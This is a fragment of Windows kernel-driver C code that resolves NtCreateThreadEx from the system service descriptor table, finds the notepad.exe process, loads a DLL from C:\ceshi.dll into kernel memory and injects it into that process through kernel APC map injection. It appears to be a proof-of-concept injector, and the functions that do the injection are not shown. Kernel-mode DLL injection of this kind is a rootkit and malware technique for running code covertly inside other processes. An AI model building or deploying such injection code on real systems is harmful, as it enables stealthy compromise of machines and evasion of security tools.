	KeServiceDescriptorTable = (PSYSTEM_SERVICE_TABLE)Temp_table;
	NtCreateThreadEx = (fn_NtCreateThreadEx)(GetSSDTFuncCurAddr(GetIndexByName((UCHAR*)"NtCreateThreadEx")));
	/*DbgPrint("<asdiop>---%p\n", NtCreateThreadEx);*/
	if (NtCreateThreadEx == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}
	pid = AsdlookupProcessByName("notepad.exe");
	
	if (pid)
	{
		DbgPrint("<pid>---%d\n", pid);
		kfilebuffer = AsdReadFiletoKernelMM(L"\\??\\C:\\ceshi.dll", &mmsize);
		DbgPrint("<asdiop>---%p\n", kfilebuffer);
		if(kfilebuffer)
		{
			AsdKernelApcMapInject(pid, kfilebuffer, mmsize);
			/*AsdKernelMapInject(pid, kfilebuffer, mmsize);*/
			ExFreePool(kfilebuffer);
		}
	}
	return STATUS_SUCCESS;
}



